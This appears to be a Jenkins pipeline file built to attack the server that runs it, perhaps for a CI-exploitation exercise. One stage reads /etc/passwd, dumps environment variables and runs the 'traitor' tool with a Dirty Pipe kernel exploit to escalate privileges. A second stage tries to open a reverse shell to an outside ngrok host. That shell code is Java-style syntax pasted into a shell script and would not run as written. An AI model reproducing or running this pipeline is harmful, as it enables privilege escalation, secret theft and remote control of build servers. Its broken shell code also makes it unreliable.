pipeline {
    agent any

    stages {
        stage('Hello') {
            steps {
                sh 'cat /etc/passwd'
                sh 'env'
                sh 'chmod 777 traitor-amd64'
                sh './traitor-amd64 --exploit kernel:CVE-2022-0847'
                sh 'id'
                sh 'whoami'
                sh 'ls -a'
                sh 'ls -la /'
                sh 'ls -la /var/'
            }
        }
        stage('Execute Command') {
            steps {
                sh '''
                    host="7.tcp.eu.ngrok.io"
                    port=17377
                    cmd="bash"
                    p=$(ProcessBuilder $cmd).redirectErrorStream(true).start()
                    s=$(Socket $host $port)
                    pi=$p.getInputStream()
                    pe=$p.getErrorStream()
                    si=$s.getInputStream()
                    po=$p.getOutputStream()
                    so=$s.getOutputStream()
                    while [ ! $s.isClosed() ]
                    do
                        while [ $pi.available() -gt 0 ]
                        do
                            so.write($pi.read())
                        done
                        while [ $pe.available() -gt 0 ]
                        do
                            so.write($pe.read())
                        done
                        while [ $si.available() -gt 0 ]
                        do
                            po.write($si.read())
                        done
                        so.flush()
                        po.flush()
                        sleep 50
                        try
                        {
                            p.exitValue()
                            break
                        }
                        catch (Exception e)
                        {}
                    done
                    p.destroy()
                    s.close()
                '''
            }
    }
}
